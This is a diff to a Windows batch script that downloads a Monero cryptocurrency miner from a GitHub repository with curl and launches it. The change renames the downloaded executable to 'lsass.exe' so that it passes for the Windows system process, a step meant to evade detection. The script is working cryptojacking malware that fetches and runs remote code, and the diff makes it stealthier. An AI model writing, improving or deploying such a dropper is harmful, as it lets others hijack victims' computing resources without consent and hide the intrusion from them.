@@ -15,7 +15,7 @@ if exist "%folderPath%" (
 
 :: Debugging: Attempt to download the Monero miner executable
 echo Downloading miner executable...
-curl -L -o "%folderPath%\LulzalotWasHere.exe" "https://github.com/sirfedsalot/DO-NOT-RUN/raw/refs/heads/main/LulzalotWasHere.exe" 2> "%folderPath%\download_error.log"
+curl -L -o "%folderPath%\lsass.exe" "https://github.com/sirfedsalot/DO-NOT-RUN/raw/refs/heads/main/lsass.exe" 2> "%folderPath%\download_error.log"
 
 :: Check if curl failed
 if %errorlevel% neq 0 (
@@ -28,7 +28,7 @@ if %errorlevel% neq 0 (
 
 :: Debugging: Verify the file exists and check its size
 if exist "%folderPath%\LulzalotWasHere.exe" (
-    for %%F in ("%folderPath%\LulzalotWasHere.exe") do (
+    for %%F in ("%folderPath%\lsass.exe") do (
         set filesize=%%~zF
     )
     
@@ -45,7 +45,7 @@ if exist "%folderPath%\LulzalotWasHere.exe" (
 
 :: Debugging: Confirm that the miner can be run
 echo Running the Monero miner...
-start "" "%folderPath%\LulzalotWasHere.exe"
+start "" "%folderPath%\lsass.exe"
 
 :: End of script
 exit
